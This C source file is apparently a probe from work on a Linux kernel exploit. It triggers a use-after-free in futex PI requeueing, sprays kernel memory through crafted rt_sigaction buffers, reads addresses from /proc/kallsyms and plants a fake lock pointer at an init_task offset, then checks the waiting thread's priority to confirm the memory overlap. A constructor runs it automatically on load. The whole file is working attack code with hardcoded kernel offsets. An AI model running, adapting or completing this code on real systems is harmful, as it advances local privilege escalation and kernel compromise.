/*
 * Quick prio monitor - just check what prio the waiter thread gets
 * during the UAF with rt_sigaction spray (no crashes expected since page_base is valid).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <signal.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;
static uint64_t g_page_base=0;
static uint64_t g_init_task=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* Use page_base-based fake_lock (SAFE - no crashes) */
    int64_t skb_d=-0xe80LL;
    uint64_t payload_base = g_page_base + (uint64_t)(int64_t)skb_d;
    uint64_t fake_lock_addr = payload_base + 0x0E80ULL;

    /* Probe sigsetsize from 8 to 0x70 - different sizes cover different depths */
    for(size_t ssz=8; ssz<=0x70; ssz+=8){
        uint8_t sabuf[0x18+0x70];
        memset(sabuf,0,sizeof(sabuf));
        /* Fill with safe init_task value */
        for(int i=0;i<(int)(0x18+ssz);i+=8) *(uint64_t*)(sabuf+i)=g_init_task;
        /* Put sentinel prio (140) at offset 0x20 (waiter->prio if overlap starts at 0x08) */
        *(int32_t*)(sabuf+0x20)=140;
        /* Put fake_lock at offset 0x60 */
        *(uint64_t*)(sabuf+0x60)=fake_lock_addr;
        *(uint64_t*)(sabuf+0x58)=g_init_task; /* task = init_task */
        for(int r=0;r<32;r++)
            syscall(134/*rt_sigaction*/,SIGUSR1,sabuf,NULL,ssz);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== rt_sigaction prio probe ===\n");
    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    /* Use hardcoded page_base from last successful KS run */
    /* This will be wrong per boot, but we just want to see prio change */
    /* Use init_task+0x9ec as fake_lock (pi_lock - wait_lock=0 at boot) */
    /* Compute page_base to make fake_lock = init_task+0x9ec */
    /* fake_lock = payload_base + 0xe80 = page_base + SKB_DELTA + 0xe80 */
    /* = page_base - 0xe80 + 0xe80 = page_base */
    /* So fake_lock = page_base. Set page_base = init_task+0x9ec */
    g_page_base = g_init_task + 0x9ecULL; /* fake_lock = init_task+0x9ec */
    /* Actually: payload_base = page_base + SKB_DATA_DELTA = page_base - 0xe80 */
    /* fake_lock = payload_base + LOCK_OFF = page_base - 0xe80 + 0xe80 = page_base */
    /* So fake_lock = page_base = init_task + 0x9ec */
    /* init_task->pi_lock at that offset: wait_lock=0 ✓, owner=??? */
    /* init_task+0x9ec+0x18 = init_task+0xa04 = pi_waiters.rb_root */
    /* At boot, pi_waiters is empty: rb_root.rb_node = 0 (NULL) → owner=NULL */
    /* → chain walk exits immediately (no deref) → safe! */
    fprintf(stderr,"[*] stext=%llx init_task=%llx\n",
            (unsigned long long)stext,(unsigned long long)g_init_task);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    for(int att=0;att<10;att++){
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
        atomic_store(&g_stop_owner,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(3000);
        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(30000);
        atomic_store(&g_stop_owner,1);
        pthread_detach(ot); pthread_detach(wt);

        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d %s\n",att,p,
                (p!=-51&&p>-100&&p<-1)?"← DIFFERENT FROM OWNER!":"");
        usleep(5000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
